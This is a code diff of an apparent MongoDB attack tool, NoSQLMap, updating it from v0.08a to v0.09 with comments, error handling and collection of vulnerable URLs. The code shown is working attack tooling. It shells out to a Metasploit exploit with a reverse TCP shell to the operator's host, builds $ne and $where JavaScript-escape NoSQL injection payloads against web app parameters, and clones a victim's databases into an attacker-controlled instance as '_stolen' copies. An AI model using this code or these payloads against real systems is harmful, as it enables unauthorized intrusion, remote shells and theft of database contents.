@@ -23,7 +23,7 @@ import urllib
 import pymongo
 import subprocess
 
-#Set a list so we can track whether options are set or not
+#Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
 global optionSet
 optionSet = [False,False,False,False,False,False]
 
@@ -32,7 +32,7 @@ def mainMenu():
 	select = True
 	while select:
 		os.system('clear')
-		print "NoSQLMap v0.08a-by Russell Butturini(tcstool@gmail.com)"
+		print "NoSQLMap v0.09-by Russell Butturini(tcstool@gmail.com)"
 		print "\n"
 		print "1-Set options (do this first)"
 		print "2-NoSQL DB Access Attacks"
@@ -47,12 +47,16 @@ def mainMenu():
 		elif select == "2":
 			if optionSet[0] == True:
 				netAttacks(victim)
+				
+			#Check minimum required options
 			else:
 				raw_input("Target not set! Check options.  Press enter to continue...")
 				mainMenu()
 			
 		
+		
 		elif select == "3":
+			#Check minimum required options
 			if (optionSet[0] == True) and (optionSet[2] == True):	
 				webApps()
 			
@@ -76,7 +80,7 @@ def options():
 	global myIP
 	global myPort
 	
-	
+	#Set default value if needed
 	if optionSet[0] == False:
 		victim = "Not Set"
 	if optionSet[1] == False:
@@ -107,22 +111,23 @@ def options():
 		
 		if select == "1":
 			victim = raw_input("Enter the host IP/DNS name: ")
-			print "Target set to " + victim + "\n"
+			print "\nTarget set to " + victim + "\n"
 			optionSet[0] = True
 			options()
 			
 		elif select == "2":
 			webPort = raw_input("Enter the HTTP port for web apps: ")
-			print "HTTP port set to " + webPort + "\n"
+			print "\nHTTP port set to " + webPort + "\n"
 			optionSet[1] = True
 			options()
 
 		elif select == "3":
 			uri = raw_input("Enter URI Path (Press enter for no URI): ")
-			print "URI Path set to " + uri + "\n"
+			print "\nURI Path set to " + uri + "\n"
 			optionSet[2] = True
 			options()
 
+		#NOT IMPLEMENTED YET FOR USE
 		elif select == "4":
 			httpMethod = True
 			while httpMethod:
@@ -161,8 +166,10 @@ def options():
 def netAttacks(target):
 	mgtOpen = False
 	webOpen = False
+	#This is a global for future use with other modules; may change
 	global dbList
 	
+	#Check for default config
 	try:
 		conn = pymongo.MongoClient(target,27017)
 		print "MongoDB port open on " + target + ":27017!"
@@ -176,6 +183,7 @@ def netAttacks(target):
 	
 	
 	try:		
+		#Future rev:  Add web management interface parsing
 		mgtRespCode = urllib.urlopen(mgtUrl).getcode()
 		if mgtRespCode == 200:
 			print "MongoDB web management open at " + mgtUrl + ".  Check this out!"
@@ -186,7 +194,7 @@ def netAttacks(target):
 		print "MongoDB web management closed."
 	
 	if mgtOpen == True:
-
+		#Ths is compiling server info?????
 		print "Server Info:"
 		serverInfo = conn.server_info()
 		print serverInfo
@@ -205,11 +213,12 @@ def netAttacks(target):
 		getShell = raw_input("Try to get a shell? (Requrires mongoDB <2.2.4)?")
 		
 		if getShell == "y" or getShell == "Y":
-			#try:
-			proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
+			#Launch Metasploit exploit
+			try:
+				proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
 			
-			#except:
-			#	print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."
+			except:
+				print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."
 	
 	raw_input("Press enter to continue...")
 	return()
@@ -219,6 +228,10 @@ def netAttacks(target):
 def webApps():
 	paramName = []
 	paramValue = []
+	vulnAddrs = []
+	possAddrs = []
+	
+	#Verify app is working.  
 	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
 	
 	appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
@@ -242,6 +255,8 @@ def webApps():
 		injectString = randInjString(int(injectSize))
 		print "Using " + injectString + " for injection testing.\n"
 		
+		#Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
+		#Add error handling for Non-200 HTTP response codes if random strings freaks out the app.
 		randomUri = buildUri(appURL,injectString)
 		print "Checking random injected parameter HTTP response size using " + randomUri +"...\n"
 		randLength = int(len(urllib.urlopen(randomUri).read()))
@@ -262,31 +277,38 @@ def webApps():
 		
 		if (randInjDelta >= 100) and (injLen != 0) :
 			print "Not equals injection response varied " + str(randInjDelta) + " bytes from random parameter! Injection works!"
+			vulnAddrs.append(neqUri)
 		
 		elif (randInjDelta > 0) and (randInjDelta < 100) and (injLen != 0) :
 			print "Response variance was only " + str(randInjDelta) + " bytes. Injection might have worked but difference is too small to be certain. "
+			possAddrs.append(neqUri)
 		
 		elif (randInjDelta == 0):
 			print "Random string response size and not equals injection were the same. Injection did not work."
 		else:
 			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+			possAddrs.append(neqUri)
 		
 		print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
 		print " Injecting " + whereStrUri
+		
 		whereStrLen = int(len(urllib.urlopen(whereStrUri).read()))
 		whereStrDelta = abs(whereStrLen - randLength)
 		
 		if (whereStrDelta >= 100) and (whereStrLen > 0):
 			print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter! Where injection works!"
+			vulnAddrs.append(whereStrUri)
 		
 		elif (whereStrDelta > 0) and (whereStrDelta < 100) and (whereStrLen - randLength > 0):
 			print " response variance was only " + str(whereStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
-		
+			possAddrs.append(whereStrUri)
+			
 		elif (whereStrDelta == 0):
 			print "Random string response size and $where injection were the same. Injection did not work."
 		
 		else:
 			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+			possAddrs.append(whereStrUri)
 		
 		print "\n"
 		print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
@@ -294,69 +316,82 @@ def webApps():
 		
 		whereIntLen = int(len(urllib.urlopen(whereIntUri).read()))
 		whereIntDelta = abs(whereIntLen - randLength)
-		#print "whereIntLen debug: " + str(whereIntLen)
-		#print "whereIntDelta debug: " + str(whereIntDelta)
 		
 		if (whereIntDelta >= 100) and (whereIntLen - randLength > 0):
 			print "Java $where escape varied " + str(whereIntDelta)  + " bytes from random parameter! Where injection works!"
-		
+			vulnAddrs.append(whereIntUri)
+			
 		elif (whereIntDelta > 0) and (whereIntDelta < 100) and (whereIntLen - randLength > 0):
 			print " response variance was only " + str(whereIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
-		
+			possAddrs.append(whereIntUri)
+			
 		elif (whereIntDelta == 0):
 			print "Random string response size and $where injection were the same. Injection did not work."
 		
 		else:
 			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
-		#Start a single record attack
+			possAddrs.append(whereIntUri)
+			
+		#Start a single record attack in case the app expects only one record back
 		
 		print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
 		print " Injecting " + whereOneStr
 		
-		if (str(urllib.urlopen(whereOneStr).read()).find('Error') != -1):
-			whereOneStrLen = int(len(urllib.urlopen(whereOneStr).read()))
-			whereOneStrDelta = abs(whereOneStrLen - randLength)
-		else:
-			whereOneStrDelta = 0
+		
+		whereOneStrLen = int(len(urllib.urlopen(whereOneStr).read()))
+		whereOneStrDelta = abs(whereOneStrLen - randLength)
 			
 		if (whereOneStrDelta >= 100) and (whereOneStrLen - randLength > 0):
 			print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter! Where injection works!"
+			vulnAddrs.append(whereOneStr)
 		
 		elif (whereOneStrDelta > 0) and (whereOneStrDelta < 100) and (whereOneStrLen - randLength > 0):
 			print " response variance was only " + str(whereOneStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
-		
+			possAddrs.append(whereOneStr)
+			
 		elif (whereOneStrDelta == 0):
 			print "Random string response size and $where single injection were the same. Injection did not work."
 		
 		else:
 			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+			possAddrs.append(whereOneStr)
+			
 		print "\n"
 		print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
 		print " Injecting " + whereOneInt
 		
-		if (str(urllib.urlopen(whereOneInt).read()).find('Error') != -1):
-			whereOneIntLen = int(len(urllib.urlopen(whereOneInt).read()))
-			whereOneIntDelta = abs(whereIntLen - randLength)
 		
-		else:
-			whereOneIntDelta = 0
+		whereOneIntLen = int(len(urllib.urlopen(whereOneInt).read()))
+		whereOneIntDelta = abs(whereIntLen - randLength)				
 			
 		if (whereOneIntDelta >= 100) and (whereOneIntLen - randLength > 0):
 			print "Java $where escape varied " + str(whereOneIntDelta)  + " bytes from random parameter! Where injection works!"
+			vulnAddrs.append(whereOneInt)
 		
 		elif (whereOneIntDelta > 0) and (whereOneIntDelta < 100) and (whereOneIntLen - randLength > 0):
 			print " response variance was only " + str(whereOneIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
-		
+			possAddrs.append(whereOneInt)
+			
 		elif (whereOneIntDelta == 0):
 			print "Random string response size and $where single record injection were the same. Injection did not work."
-		
+			
 		else:	
 			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
-	
+			possAddrs.append(whereOneInt)
+		
+		print "\n"	
+		print "Vunerable URLs:"
+		print "\n".join(vulnAddrs)
+		print "\n"
+		print ""
+		print "Possibly vulnerable URLS:"
+		print"\n".join(possAddrs)
+		
 	raw_input("Press enter to continue...")
 	return()
 
 def randInjString(size):
+	#add more specific params (such as only letters, only numbers, etc.)
 	chars = string.ascii_letters + string.digits
 	return ''.join(random.choice(chars) for x in range(size))
 
@@ -369,6 +404,7 @@ def buildUri(origUri, randValue):
 	global whereOneStr
 	global whereOneInt
 	
+	#Split the string between the path and parameters, and then split each parameter
 	split_uri = origUri.split("?")
 	params = split_uri[1].split("&")
 	
@@ -393,9 +429,9 @@ def buildUri(origUri, randValue):
 			evilUri += paramName[x] + "=" + randValue + "&"
 			neqUri += paramName[x] + "[$ne]=" + randValue + "&"
 			whereStrUri += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
-			whereIntUri += paramName[x] + "=a; return db.a.find(); var dummy='!" + "&"
+			whereIntUri += paramName[x] + "=a; return db.a.find(); var dummy=1" + "&"
 			whereOneStr += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
-			whereOneInt += paramName[x] + "=a; return db.a.findOne(); var dummy='!" + "&"
+			whereOneInt += paramName[x] + "=a; return db.a.findOne(); var dummy=1" + "&"
 		else:
 			evilUri += paramName[x] + "=" + paramValue[x] + "&"
 			neqUri += paramName[x] + "=" + paramValue[x] + "&"
@@ -405,7 +441,7 @@ def buildUri(origUri, randValue):
 			whereOneInt += paramName[x] + "=" + paramValue[x] + "&"
 			
 		x += 1		
-	#Clip the last & off
+	#Clip the extra & off the end of the URL
 	evilUri = evilUri[:-1]
 	neqUri = neqUri[:-1]
 	whereStrUri = whereStrUri[:-1]
@@ -430,6 +466,7 @@ def stealDBs(myDB):
 		stealDBs(myDB)
 		
 	try:
+		#Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
 		myDBConn = pymongo.MongoClient(myDB,27017)
 		myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
 		cloneAnother = raw_input("Database cloned.  Copy another?")
